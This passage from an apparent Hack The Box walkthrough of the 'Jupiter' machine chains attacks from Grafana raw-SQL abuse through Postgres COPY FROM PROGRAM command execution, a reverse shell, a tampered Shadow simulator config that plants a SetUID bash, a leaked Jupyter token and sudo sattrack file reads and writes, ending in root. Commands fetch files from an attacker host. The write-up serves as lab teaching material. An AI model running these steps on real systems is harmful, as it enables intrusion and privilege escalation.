after the Greek Titans","King of the Jotnar in Norse mythology","A Jotunn (giant). Father of Skadi","One of the Titans. Mother of the Oceanids","Personification of divine blessing and success. One of the Oceanids","A divine figure of a bulle with three cranes perched on its back","A lunar (moon) deity in Inuit mythology","A Jotunn (giant) in Norse mythology","Also known as Surt. Leader of the fire Jotunn (giants)","Master of illusions and master of castle ruler of the castle Utgardr in Norse mythology","Giant wolf from Norse mythology. Son of Fenrir","Also known as Skadi. A goddess associated with bowhunting, skiing, winter, and the mountains","Inuit goddess of the sea. Also known as Sedna","null","null","null","null","null","null","null","null","null","null","null","null","null","null","null","null","null","null","null","null","One of the Titans. Older sister of Cronus","One of the Titans. Known for stealing the fire of the gods and gifting it to humanity","Alternative name for Pullux, son of Zeus and Leda","One of the first generation Titaness. It means \"shining\" or \"bright\". Original owner of the oracle of Delphi","Also known as Anesidora. It means \"she who sends up gifts\"","God of the wild, sheperds, and flocks","One of the Alkyonides, the seven beautiful daughters of Alkyoneus","Named after Nafi, a Jotunn (giant) in Norse mythology","Father of the Sun and the Moon in Norse mythology","One of the Gigantes (giants). Son of Gaia (Earth)","One of the Alkyonides, the seven beautiful daughters of Alkyoneus","Also named Logi. A fire Jotunn (giant)","A hero in the Inuit mythology","Personification of wind in Norse mythology","A female Jotunn (giant)","Roman god of beginnings, duality, time, and doorways","Shapeshifting creature in Inuit mythology","One of the Titans. Father of Atlas and Prometheus. Also written as Japetus","A female Jotunn (giant)","Titan god of observation. Father of Helios, Eos, and Selene (the Moon)","Named after Helen of Troy. Granddaughter of Cronus","Giant wolf from Norse mythology","A female Jotunn (giant)","A female Jotunn (giant)","A female Jotunn (giant)","Wife of the god Freyr","A Jotunn (giant) who was killed by Thor","Giant wolf from Norse mythology","Father of Loki","A giant in Gaulish (Celtic) mythology","One of the Titans. Brother of Prometheus","One of the Gigantes (giants). Son of Gaia (Earth) and Uranus (Sky)","A Jotunn (giant) who raises wolves","One of the Titans","A Sicilian sheperd, descendant of the Titans","A nymph who lived in the island of Ogygia","Mother of Odin","A Jotunn (giant)","Irish goddess of birth","One of the Titans. Condemned to hold up the sky for eternity after the Titanomachy","It means \"flowery\". One of the Alkyonides, the seven beautiful daughters of Alkyoneus","A female Jotunn (giant)","A Jotunn (giant). Father of Thiazzi","Named after a Gallic giant who said to be the \"king of the world\"","Personification of the tranquil seas in Norse mythology","One of the hekatonkheires, three giants of Greek mythology"]]}}]}}}

```

This is just the data for the dashboard.

### PostGres Execution

#### Query POC

It seems as if I can send raw Postgres queries into the database. I’ll send this request to Repeater and try editing the `rawSql` field to a simple `select version()`:

![image-20230831161136180](https://0xdf.gitlab.io/img/image-20230831161136180.png)

It returns all the details. This has actually be raised as an [issue on GitHub](https://github.com/grafana/grafana/issues/32043) and the creator said it will be a long time before this is fixed! Someone on the thread calls this SQL injection, but it’s more like straight up raw SQL querying.

#### RCE POC

I can use this to enumerate the database, but there’s nothing really important there to find.

[This post](https://medium.com/greenwolf-security/authenticated-arbitrary-command-execution-on-postgresql-9-3-latest-cd18945914d5) talks about turning Postgres queries into command execution, which was given the ID CVE-2019-9193. It’s not really a CVE as much as it is a feature that is easily abused.

The post outlines the following steps:

1. `DROP TABLE IF EXISTS cmd_exec;` \- remove the `cmd_exec` table if it exists; this returns a `results` structure with no values.

2. `CREATE TABLE cmd_exec(cmd_output text);` \- create a table to store command output in; this returns a `results` structure with no values.

3. `COPY cmd_exec FROM PROGRAM 'id';` \- get the results of the `id` command into the table; this returns a `results` structure with no values. It is important to get regularly single quotes, not the fancy once that copy out of the post.

4. `SELECT * FROM cmd_exec;` \- display the results - this returns a `results` structure with a bunch of stuff, most importantly:



```
"data": {
       "values": [
           [
               "uid=114(postgres) gid=120(postgres) groups=120(postgres),119(ssl-cert)"
           ]
       ]
}

```


That’s RCE!

#### Shell

To get a shell, I don’t have to recreate the table or worry about the output. I’ll pull up the third command above and replace `id` with a [bash reverse shell](https://www.youtube.com/watch?v=OjkVep2EIlw):

![image-20230831162307047](https://0xdf.gitlab.io/img/image-20230831162307047.png)

On sending this, I get a shell at `nc`:

```
oxdf@hacky$ nc -lvnp 443
Listening on 0.0.0.0 443
Connection received on 10.10.11.216 51132
bash: cannot set terminal process group (1494): Inappropriate ioctl for device
bash: no job control in this shell
postgres@jupiter:/var/lib/postgresql/14/main$

```

I’ll upgrade my shell using the [standard trick](https://www.youtube.com/watch?v=DqE6DxqJg8Q):

```
postgres@jupiter:/var/lib/postgresql/14/main$ script /dev/null -c bash
script /dev/null -c bash
Script started, output log file is '/dev/null'.
postgres@jupiter:/var/lib/postgresql/14/main$ ^Z
[1]+  Stopped                 nc -lvnp 443
oxdf@hacky$ stty raw -echo ; fg
nc -lvnp 443
            reset
reset: unknown terminal type unknown
Terminal type? screen
postgres@jupiter:/var/lib/postgresql/14/main$

```

## Shell as juno

### Enumeration

#### Filesystem

The postgres user’s home directory is in `/var/lib/postgres`, and doesn’t have much interesting.

There are two users on the box with directories in `/home`:

```
postgres@jupiter:/home$ ls
jovian  juno
postgres@jupiter:/home$ ls */
ls: cannot open directory 'jovian/': Permission denied
ls: cannot open directory 'juno/': Permission denied

```

postgres can’t access either.

There’s an interesting directory in `/opt`, but postgres can’t access it, as it’s owned by jovian and in the science group:

```
postgres@jupiter:/$ ls -l /opt/
total 4
drwxrwx--- 4 jovian science 4096 May  4 18:59 solar-flares
postgres@jupiter:/$ ls opt/solar-flares/
ls: cannot open directory 'opt/solar-flares/': Permission denied

```

There’s also a `network-simulation.yml` and `shadow.data` folder in `/dev/shm`:

```
postgres@jupiter:/dev/shm$ ls
network-simulation.yml  PostgreSQL.2103401574  shadow.data

```

I’ll come back to this shortly.

#### Processes

The output of `ps auxww` has one interesting line:

```
jovian      1163  0.0  1.6  81332 66616 ?        S    19:24   0:00 /usr/bin/python3 /usr/local/bin/jupyter-notebook --no-browser /opt/solar-flares/flares.ipynb

```

A Jupyter notebook running as jovian, with notebooks in the folder that I can’t access yet. I’ll have to come back to this.

#### pspy

To further look at the processes, I’ll use [pspy](https://github.com/DominicBreuker/pspy) to look for any crons. I’ll serve it with a Python webserver on my host, and upload it with `wget`, then setting it as executable:

```
postgres@jupiter:/dev/shm$ wget 10.10.14.6/pspy64
--2023-08-31 20:35:55--  http://10.10.14.6/pspy64
Connecting to 10.10.14.6:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 3104768 (3.0M) [application/octet-stream]
Saving to: ‘pspy64’

pspy64              100%[===================>]   2.96M  2.10MB/s    in 1.4s

2023-08-31 20:35:57 (2.10 MB/s) - ‘pspy64’ saved [3104768/3104768]

postgres@jupiter:/dev/shm$ chmod +x pspy64

```

I’ll run it, and watch for interesting programs, especially when the minute changes:

```
postgres@jupiter:/dev/shm$ ./pspy64
...[snip]...

```

There’s a bunch of commands run as user id 1000 (juno) every two minutes:

```
2023/08/31 20:38:01 CMD: UID=1000  PID=2488   | /bin/sh -c /home/juno/shadow-simulation.sh
2023/08/31 20:38:01 CMD: UID=1000  PID=2489   | /bin/bash /home/juno/shadow-simulation.sh
2023/08/31 20:38:01 CMD: UID=1000  PID=2490   | /bin/bash /home/juno/shadow-simulation.sh
2023/08/31 20:38:01 CMD: UID=1000  PID=2491   | /home/juno/.local/bin/shadow /dev/shm/network-simulation.yml
2023/08/31 20:38:01 CMD: UID=1000  PID=2495   | lscpu --online --parse=CPU,CORE,SOCKET,NODE
2023/08/31 20:38:01 CMD: UID=1000  PID=2494   | sh -c lscpu --online --parse=CPU,CORE,SOCKET,NODE
2023/08/31 20:38:01 CMD: UID=1000  PID=2500   | /usr/bin/python3 -m http.server 80
2023/08/31 20:38:01 CMD: UID=1000  PID=2501   | /usr/bin/curl -s server
2023/08/31 20:38:01 CMD: UID=1000  PID=2503   | /usr/bin/curl -s server
2023/08/31 20:38:01 CMD: UID=1000  PID=2505   | /usr/bin/curl -s server
2023/08/31 20:38:01 CMD: UID=1000  PID=2510   | /bin/bash /home/juno/shadow-simulation.sh

```

It seems to be running `shadow-simulation.sh` and using the `network-simulation.yml` file from `/dev/shm`.

### Execution via Shadow Simulation

#### Background

The [Shadow Simulator](https://shadow.github.io/docs/guide/shadow.html) is a network simulator the runs by executing real programs on Linux. I’ll take a look at the config file from `/dev/shm` that seems to be involved in the execution:

```
general:
  # stop after 10 simulated seconds
  stop_time: 10s
  # old versions of cURL use a busy loop, so to avoid spinning in this busy
  # loop indefinitely, we add a system call latency to advance the simulated
  # time when running non-blocking system calls
  model_unblocked_syscall_latency: true

network:
  graph:
    # use a built-in network graph containing
    # a single vertex with a bandwidth of 1 Gbit
    type: 1_gbit_switch

hosts:
  # a host with the hostname 'server'
  server:
    network_node_id: 0
    processes:
    - path: /usr/bin/python3
      args: -m http.server 80
      start_time: 3s
  # three hosts with hostnames 'client1', 'client2', and 'client3'
  client:
    network_node_id: 0
    quantity: 3
    processes:
    - path: /usr/bin/curl
      args: -s server
      start_time: 5s

```

It’s creating a network with a single gigabyte switch, and then four hosts. The first is a server the runs a Python webserver after three seconds, and then three clients that use `curl` to request that page after five seconds.

#### Modify

It looks like this can run whatever programs I want it to run. I’ll update the `network-simulation.yml` file in `/dev/shm`:

```
general:
  stop_time: 10s
  model_unblocked_syscall_latency: true

network:
  graph:
    type: 1_gbit_switch

hosts:
  server:
    network_node_id: 0
    processes:
    - path: /usr/bin/cp
      args: /bin/bash /tmp/0xdf
      start_time: 3s
    - path: /usr/bin/chmod
      args: 6755 /tmp/0xdf
      start_time: 5s

```

I’ll just have it create a single server with two processes. The first will create a copy of `bash` in `/tmp` and the seconds will set it as SetUID/SetGID. Once the cron runs, `/tmp/0xdf` is there, owned by juno, SetUID/SetGID, and running it with `-p` gives a shell with effective uid and gid of juno:

```
postgres@jupiter:/dev/shm$ ls -l /tmp/0xdf
-rwsr-sr-x 1 juno juno 1396520 Aug 31 20:56 /tmp/0xdf
postgres@jupiter:/dev/shm$ /tmp/0xdf -p
0xdf-5.1$ id
uid=114(postgres) gid=120(postgres) euid=1000(juno) egid=1000(juno) groups=1000(juno),119(ssl-cert),120(postgres)

```

I’m able to read `user.txt`:

```
0xdf-5.1$ cat user.txt
471f84c2************************

```

## Shell as jovian

### SSH as juno

At this point, I’ve already noticed the Jupyter process running as the other user, jovian. I’ve also noted that the folder in `/opt` is in the science group.

Interesting, juno should also be a member of science:

```
0xdf-5.1$ cat /etc/group | grep science
science:x:1001:juno,jovian

```

When I get a shell as juno by running a SetUID and/or SetGID `bash`, it only brings in the effective userid and/or group id. It doesn’t bring in all the other groups that that user may belong to.

I’ll go into juno’s `.ssh` directory and add my public key to the `authorized_keys` file:

```
0xdf-5.1$ cd /home/juno/.ssh/
0xdf-5.1$ ls
authorized_keys
0xdf-5.1$ echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDIK/xSi58QvP1UqH+nBwpD1WQ7IaxiVdTpsg5U19G3d nobody@nothing" >> authorized_keys

```

Now I can SSH in as juno:

```
oxdf@hacky$ ssh -i ~/keys/ed25519_gen juno@jupiter.htb
Welcome to Ubuntu 22.04.2 LTS (GNU/Linux 5.15.0-72-generic x86_64)
...[snip]...
juno@jupiter:~$

```

This shell has the science group:

```
juno@jupiter:~$ id
uid=1000(juno) gid=1000(juno) groups=1000(juno),1001(science)

```

### Access To Jupyter Notebook

#### /opt/solar-flares

The `/opt/solar-flares` directory has a bunch of files related to a Jupyter Notebook:

```
juno@jupiter:/opt/solar-flares$ ls
cflares.csv  flares.csv  flares.html  flares.ipynb  logs  map.jpg  mflares.csv  start.sh  xflares.csv

```

The `start.sh` script starts the notebook in such a way that it logs everything into a log file named with the current date in the `logs` directory:

```
#!/bin/bash
now=`date +"%Y-%m-%d-%M"`
jupyter notebook --no-browser /opt/solar-flares/flares.ipynb 2>> /opt/solar-flares/logs/jupyter-${now}.log &

```

A Jupyter Notebook is a Python interactive webpage that runs Python code in a series of cells and displays the output. They are incredibly popular in the scientific community where people use them to do some coding without writing full on programs.

#### Load Jupyter

Rather than look at the raw Jupyter files, I’ll view the web interface, which typically runs on port 8888. There is a service running on 8888 only on localhost on Jupiter:

```
juno@jupiter:/opt/solar-flares$ netstat -tnlp
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
tcp        0      0 127.0.0.1:5432          0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.1:3000          0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.1:8888          0.0.0.0:*               LISTEN      -
tcp6       0      0 :::22                   :::*                    LISTEN      -

```

I’ll reconnect my SSH session with `-L 8888:localhost:8888` to forward port 8888 on my VM through the SSH connection and to `localhost:8888` on Jupiter.

On loading `localhost:8888` in Firefox, it shows the page, asking for a password/token to get access:

![image-20230831172351464](https://0xdf.gitlab.io/img/image-20230831172351464.png)

#### Access Notebook

The token is printed to the console when Jupyter is started. Since all of that is being logged to files, I’ll check those out:

![image-20230831172547214](https://0xdf.gitlab.io/img/image-20230831172547214.png)

The token is in the file. On entering that, it loads the Jupyter interface:

![image-20230831172624288](https://0xdf.gitlab.io/img/image-20230831172624288.png)

### Execution

#### POC

I’ll open up `flares.ipynb`, and it shows the notebook:

![image-20230831172715704](https://0xdf.gitlab.io/img/image-20230831172715704.png)

There’s some plots and stuff, but I’m interested in running Python commands.

I’ll add a cell at the bottom and type in some simple code:

![image-20230831172949096](https://0xdf.gitlab.io/img/image-20230831172949096.png)

With my cursor in that cell, Shift-Enter will run it:

![image-20230831173015339](https://0xdf.gitlab.io/img/image-20230831173015339.png)

#### SSH

I can work from that same cell, updating the code and using Shift-Enter to execute.

![image-20230831173126161](https://0xdf.gitlab.io/img/image-20230831173126161.png)

I’ll create a `.ssh` directory and write my public key into `authorized_keys`:

![image-20230831173357355](https://0xdf.gitlab.io/img/image-20230831173357355.png)

Now I can connect with SSH:

```
oxdf@hacky$ ssh -i ~/keys/ed25519_gen jovian@jupiter.htb
Welcome to Ubuntu 22.04.2 LTS (GNU/Linux 5.15.0-72-generic x86_64)
...[snip]...
jovian@jupiter:~$

```

## Shell as root

### Enumeration

jovian is able to run `sattrack` as root with `sudo`:

```
jovian@jupiter:~$ sudo -l
Matching Defaults entries for jovian on jupiter:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User jovian may run the following commands on jupiter:
    (ALL) NOPASSWD: /usr/local/bin/sattrack

```

### sattrack Config File

#### Missing Config

Running the program complains about a missing configuration file:

```
jovian@jupiter:~$ sudo sattrack
Satellite Tracking System
Configuration file has not been found. Please try again!

```

`-h` or `--help` don’t seem to change this output. I’ll run `strace` to see what it’s trying to load:

```
jovian@jupiter:~$ strace sattrack
execve("/usr/local/bin/sattrack", ["sattrack"], 0x7ffc84172ca0 /* 23 vars */) = 0
...[snip]...
newfstatat(1, "", {st_mode=S_IFCHR|0620, st_rdev=makedev(0x88, 0x2), ...}, AT_EMPTY_PATH) = 0
write(1, "Satellite Tracking System\n", 26Satellite Tracking System
) = 26
newfstatat(AT_FDCWD, "/tmp/config.json", 0x7ffce5ff34c0, 0) = -1 ENOENT (No such file or directory)
write(1, "Configuration file has not been "..., 57Configuration file has not been found. Please try again!
) = 57
getpid()                                = 4290
exit_group(1)                           = ?
+++ exited with 1 +++

```

It’s always best to start at the bottom with `strace`. I’ll see it writes the header, and then tries to get file status on `/tmp/config.json` with `newfstatat` ( [man page](http://man.he.net/man2/newfstatat)). When that fails, it write the failure message.

There are a bunch of ways to get a valid config file. I’ll show three.

#### Find On Jupiter \[Option 1\]

Given that I need a `config.json` file, why not see if one exists somewhere on Jupiter. The `find` command finds a good candidate:

```
jovian@jupiter:~$ find / -name 'config.json' 2>/dev/null
/usr/local/share/sattrack/config.json
/usr/local/lib/python3.10/dist-packages/zmq/utils/config.json

```

#### Following Error Messages \[Option 2\]

The most fun way to solve this is to build the config file using error messages. I’ll start by creating `/tmp/config.json`:

```
jovian@jupiter:~$ touch /tmp/config.json
jovian@jupiter:~$ sattrack
Satellite Tracking System
Malformed JSON conf: [json.exception.parse_error.101] parse error at line 1, column 1: syntax error while parsing value - unexpected end of input; expected '[', '{', or a literal

```

It’s giving a parsing error. I’ll update to valid JSON:

```
jovian@jupiter:~$ echo '{}' > /tmp/config.json
jovian@jupiter:~$ sattrack
Satellite Tracking System
tleroot not defined in config

```

Now it wants `tleroot`. I’ll add that, and just give it a blank value, since I don’t know what this is:

```
jovian@jupiter:~$ echo '{"tleroot": ""}' > /tmp/config.json
jovian@jupiter:~$ sattrack
Satellite Tracking System
tleroot does not exist, creating it:
terminate called after throwing an instance of 'std::filesystem::__cxx11::filesystem_error'
  what():  filesystem error: cannot create directory: No such file or directory []
Aborted (core dumped)

```

It’s failing trying to create a directory! I’ll give it a value to see if that works.

```
jovian@jupiter:~$ echo '{"tleroot": "/tmp/0xdf-tleroot"}' > /tmp/config.json
jovian@jupiter:~$ sattrack
Satellite Tracking System
tleroot does not exist, creating it: /tmp/0xdf-tleroot
updatePerdiod not defined in config

```

It claims to have created `/tmp/0xdf-tleroot`, and it did:

```
jovian@jupiter:~$ ls -d /tmp/0xdf-tleroot/
/tmp/0xdf-tleroot/

```

Now it wants `updatePerdiod` (note the typo in “period”), so I’ll add that, trying to represent a value like 10 seconds:

```
jovian@jupiter:~$ echo '{"tleroot": "/tmp/0xdf-tleroot", "updatePerdiod": "10s"}' > /tmp/config.json
jovian@jupiter:~$ sattrack
Satellite Tracking System
updatePerdiod is not a unsigned number

```

It wants an int:

```
jovian@jupiter:~$ echo '{"tleroot": "/tmp/0xdf-tleroot", "updatePerdiod": 10}' > /tmp/config.json
jovian@jupiter:~$ sattrack
Satellite Tracking System
station not defined in config

```

Without knowing what station is, I’ll guess a string and see what happens:

```
jovian@jupiter:~$ echo '{"tleroot": "/tmp/0xdf-tleroot", "updatePerdiod": 10, "station": "0xdf"}' > /tmp/config.json
jovian@jupiter:~$ sattrack
Satellite Tracking System
station is not a object

```

Ah, ok. I’ll give it an object:

```
jovian@jupiter:~$ echo '{"tleroot": "/tmp/0xdf-tleroot", "updatePerdiod": 10, "station": {}}' > /tmp/config.json
jovian@jupiter:~$ sattrack
Satellite Tracking System
name not defined in config

```

Did that work? I guess so. Moving on to `name`:

```
jovian@jupiter:~$ echo '{"tleroot": "/tmp/0xdf-tleroot", "updatePerdiod": 10, "station": {}, "name": "0xdf"}' > /tmp/config.json
jovian@jupiter:~$ sattrack
Satellite Tracking System
name not defined in config

```

That didn’t work. Perhaps it wants the name as part of the `station`?

```
jovian@jupiter:~$ echo '{"tleroot": "/tmp/0xdf-tleroot", "updatePerdiod": 10, "station": {"name": "0xdf"}}' > /tmp/config.json
jovian@jupiter:~$ sattrack
Satellite Tracking System
lat not defined in config

```

That worked! There’s a bunch more, but I’ll leave it here, as while this is kind of a fun challenge, it’s not necessary.

#### Find on GitHub \[Option 3\]

This software is a modified version of [arftracksat](https://github.com/arf20/arftracksat), which is open source on GitHub. It’s not easy to find with the filename or banner, but once you get some feel for the config file, knowing it wants `tleroot` is enough to find it:

![image-20230831175909064](https://0xdf.gitlab.io/img/image-20230831175909064.png)

There’s an example `config.json` file there:

![image-20230831175534890](https://0xdf.gitlab.io/img/image-20230831175534890.png)

### Running sattrack

I’ll copy the config file from `/usr/local/share` and give this a run:

```
jovian@jupiter:~$ cp /usr/local/share/sattrack/config.json /tmp/
jovian@jupiter:~$ sattrack
Satellite Tracking System
tleroot does not exist, creating it: /tmp/tle/
Get:0 http://celestrak.org/NORAD/elements/weather.txt
Could not resolve host: celestrak.org
Get:0 http://celestrak.org/NORAD/elements/noaa.txt
Could not resolve host: celestrak.org
Get:0 http://celestrak.org/NORAD/elements/gp.php?GROUP=starlink&FORMAT=tle
Could not resolve host: celestrak.org
Satellites loaded
No sats

```

It hangs on each source, timing out unable to resolve each host. There’s an empty file for each in the TLE directory:

```
jovian@jupiter:~$ ls -l /tmp/tle/
total 0
-rw-rw-r-- 1 jovian jovian 0 Aug 31 22:10 'gp.php?GROUP=starlink&FORMAT=tle'
-rw-rw-r-- 1 jovian jovian 0 Aug 31 22:10  noaa.txt
-rw-rw-r-- 1 jovian jovian 0 Aug 31 22:10  weather.txt

```

### File Read

One way to abuse this is to use the `file://` protocol handler. I’ll replace the fetched URIs with attempts to read `root.txt` and an private SSH key:

```
{
        "tleroot": "/tmp/tle/",
        "tlefile": "weather.txt",
        "mapfile": "/usr/local/share/sattrack/map.json",
        "texturefile": "/usr/local/share/sattrack/earth.png",

        "tlesources": [
                "file:///root/root.txt",
                "file:///root/.ssh/id_rsa"
        ],

        "updatePerdiod": 1000,

        "station": {
                "name": "LORCA",
                "lat": 37.6725,
                "lon": -1.5863,
                "hgt": 335.0
        },

        "show": [
        ],

        "columns": [
                "name",
                "azel",
                "dis",
                "geo",
                "tab",
                "pos",
                "vel"
        ]
}

```

When I run this, it gets `root.txt`, but no key:

```
jovian@jupiter:~$ sudo sattrack
Satellite Tracking System
Get:0 file:///root/root.txt
Get:1 file:///root/.ssh/id_rsa
Couldn't open file /root/.ssh/id_rsa
Satellites loaded
No sats

```

Still, `root.txt` is in the tleroot directory:

```
jovian@jupiter:~$ ls /tmp/tle/
'gp.php?GROUP=starlink&FORMAT=tle'   id_rsa   noaa.txt   root.txt   test   weather.txt
jovian@jupiter:~$ cat /tmp/tle/root.txt
239169f5************************

```

### File Write -> SSH

One way to get a shell as root would be to write an SSH key into `/root/.ssh/authorized_keys`. I’ll host my public key in a file named `authorized_keys` on my webserver, and add that to the config. I’ll also set the `tleroot` to `/root/.ssh` so that it writes there:

```
{
        "tleroot": "/root/.ssh/",
        "tlefile": "weather.txt",
        "mapfile": "/usr/local/share/sattrack/map.json",
        "texturefile": "/usr/local/share/sattrack/earth.png",

        "tlesources": [
                "http://10.10.14.6/authorized_keys"
        ],

        "updatePerdiod": 1000,

        "station": {
                "name": "LORCA",
                "lat": 37.6725,
                "lon": -1.5863,
                "hgt": 335.0
        },

        "show": [
        ],

        "columns": [
                "name",
                "azel",
                "dis",
                "geo",
                "tab",
                "pos",
                "vel"
        ]
}

```

When I run this, there’s a a hit at my webserver:

```
10.10.11.216 - - [31/Aug/2023 21:16:10] "GET /authorized_keys HTTP/1.1" 200 -

```

It reports that it got the file, but then complains that it wasn’t a valid file, likely because it isn’t formatted as expected.

```
jovian@jupiter:~$ sudo sattrack
Satellite Tracking System
Get:0 http://10.10.14.6/authorized_keys
tlefile is not a valid file
jovian@jupiter:~$

```

Still, it must have written, as I can now log in as root over SSH:

```
oxdf@hacky$ ssh -i ~/keys/ed25519_gen root@jupiter.htb
Welcome to Ubuntu 22.04.2 LTS (GNU/Linux 5.15.0-72-generic x86_64)
...[snip]...
root@jupiter:~#

```





